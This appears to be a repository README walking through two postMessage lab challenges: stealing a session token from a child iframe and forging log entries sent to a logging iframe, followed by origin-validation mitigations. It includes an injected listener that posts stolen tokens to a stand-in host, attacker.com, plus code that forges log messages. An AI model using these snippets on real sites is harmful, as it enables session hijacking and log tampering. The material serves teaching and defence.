# Web Application Security Challenges: postMessage Exploits

This repository demonstrates two security challenges related to **postMessage**, a JavaScript method for cross-origin communication. These challenges explore vulnerabilities that can be exploited in web applications, specifically focusing on stealing session tokens and injecting fake log messages.

### Challenge 1 Solution: Stealing the Session Token (postMessage Exploit)

In this solution, we have a basic scenario where a parent page listens for a postMessage from a child iframe that contains a session token. The attacker exploits this scenario to steal the session token by injecting a malicious script that listens for the postMessage event and displays the token.

#### Solution Overview
The parent page listens for a message from the iframe using window.addEventListener('message'). The message is expected to contain a session token.

The child iframe sends the session token to the parent page using window.parent.postMessage(sessionToken, '*').

An attacker can exploit this by injecting their own script into the parent page, allowing them to intercept and display the session token.

#### Steps to Exploit
Parent Page: The parent page includes a script that listens for messages and displays the session token.

```js
<!DOCTYPE html>
<html>
<head>
    <title>Token Listener</title>
</head>
<body>
    <h1>Token Listener</h1>
    <div id="token-display"></div>
    <iframe id="test" src="https://html5server.digi.ninja/l_child.php" style="width:100%; height:300px; border:1px solid #ddd;"></iframe>
    <script>
        window.addEventListener('message', function(event) {
            console.log(event); // Log the event data
            console.log('Message data:', event.data);
            document.getElementById('token-display').innerText = "Token: " + event.data; // Display token
        });
    </script>
</body>
</html>
```

Child iframe: The child iframe (in the given example, l_child.php) sends the session token back to the parent using **window.parent.postMessage**.

// The child iframe sends a postMessage containing the session token
const sessionToken = 'example-session-token'; // Example session token
window.parent.postMessage(sessionToken, '*'); // Send token to parent
Attacker's Exploit: The attacker injects a script in the parent page, listening for the postMessage event. When the session token is received, the attacker can display it or send it to a remote server.

#### Example of the injected malicious script:

```js
// Malicious script injected into the parent page
window.addEventListener('message', function(event) {
    // Check that the message came from the trusted source
    console.log(event); // Log the event data
    console.log('Message data:', event.data); // Print out the session token
    // Send the token to a remote server (attacker's server)
    fetch('http://attacker.com/steal-token', {
        method: 'POST',
        body: JSON.stringify({ token: event.data }),
        headers: {
            'Content-Type': 'application/json'
        }
    });
});
```
### Potential Exploitation

By injecting the malicious script in the parent page (e.g., through XSS or by controlling the page's code), an attacker could steal the session token when the child iframe sends it. The attacker could then forward this token to their own server or use it to impersonate the user.

#### Security Considerations
Origin Validation: The parent page should check the origin of the message using event.origin to ensure the message is coming from a trusted source, like so:

```js
if (event.origin !== 'https://trusted-child-domain.com') {
    return; // Ignore untrusted messages
}
```
**Access Control**: Use a secure mechanism for authentication and authorization (e.g., CSRF tokens, Secure HTTP Headers, SameSite cookies).

**Mitigation Strategies**
Always validate the origin of the message to ensure the message is coming from a trusted source.

Example:

```js
window.addEventListener('message', function(event) {
    if (event.origin !== 'https://trusted-iframe.com') {
        return; // Reject messages from untrusted sources
    }
    // Process valid messages
    console.log(event.data);
});
```

Implement secure session management: Use HTTPS for secure communication and set proper session expiry and token encryption.

## Conclusion
This challenge demonstrates how postMessage can be exploited in web applications to steal sensitive information like session tokens. Proper validation and secure coding practices are essential to prevent such attacks.

## Challenge 2: Fake the Log
### Challenge Overview

In this challenge, the objective is to inject fake messages into a logging system that uses postMessage to send log messages to a central log server. The parent page listens for postMessage events from the child iframe and processes them as legitimate log entries.

### Solution Overview

The parent page sends messages to the child iframe, which listens for these messages and responds back by sending log data.

The challenge is to inject fake log messages by sending a manipulated postMessage from the parent window to the iframe.

An attacker can exploit this scenario by controlling the parent page or the iframe and sending their own log data to the server, mimicking legitimate logs.

### Exploiting postMessage to Inject Fake Logs
Identifying the Log System: The attacker needs to identify how the parent or child window is communicating with the logging server.

Injecting Fake Log Messages: By using postMessage, the attacker can send forged log messages that are forwarded to the server, creating false logs such as fake errors or user actions.

#### Example of Exploiting the Vulnerability:

#### Steps to Exploit

Parent Page: The parent page includes an iframe that loads a child page. The parent sends a postMessage to the iframe, instructing it to send messages back to the server.

Here's the code for the parent page:

```js
<!DOCTYPE html>
<html>
<head>
    <title>Token Listener</title>
</head>
<body>
    <h1>Token Listener</h1>
    <div id="token-display"></div>
    
    <!-- The iframe that will be used for communication -->
    <iframe id="test" src="https://html5server.digi.ninja/s_child.html?origin=https://html5.digi.ninja"
            style="width:100%; height:300px; border:1px solid #ddd;"></iframe>

    <script>
        const frame = document.querySelector("#test");

        frame.addEventListener("load", () => {
            // Sending a message from the parent to the iframe
            frame.contentWindow.postMessage("test", "https://html5server.digi.ninja");
        });

        // Update the /etc/hosts file to resolve html5server.digi.ninja to 127.0.0.1 for local interception
        // Edit /etc/hosts and add: 127.0.0.1 html5server.digi.ninja
    </script>
</body>
</html>

```
Child Iframe: The iframe listens for postMessage events and sends the message data to a log server.

The iframe's page might look something like this:

```js
<!DOCTYPE html>
<html>
<head>
    <title>Child Log Listener</title>
</head>
<body>
    <h1>Log Data</h1>
    <div id="log-display"></div>

    <script>
        // Listen for messages from the parent
        window.addEventListener("message", (event) => {
            if (event.origin !== 'https://html5.digi.ninja') {
                return; // Ignore messages from untrusted sources
            }

            // Process the message and send it to the log server
            const logData = event.data;
            fetch('https://central-log-server.com/log', {
                method: 'POST',
                body: JSON.stringify({ log: logData }),
                headers: {
                    'Content-Type': 'application/json',
                },
            });
        });
    </script>
</body>
</html>

```

Attacker's Exploit: The attacker can modify the parent page's postMessage call to inject fake log entries.

The attacker can edit the parent page's script to send arbitrary log data to the iframe, causing fake messages to be sent to the log server:

```js
// Attacker can modify the message to send fake log data
frame.contentWindow.postMessage("Fake log message: XSS attack detected!", "https://html5server.digi.ninja");
```

## Conclusion
This challenge demonstrates the security risks associated with using postMessage for communication between a parent page and an iframe. By manipulating the messages sent through postMessage, an attacker can inject fake log messages into the logging system. Proper validation of message origins, careful sanitization of log data, and secure server-side logging mechanisms are crucial for protecting against such attacks.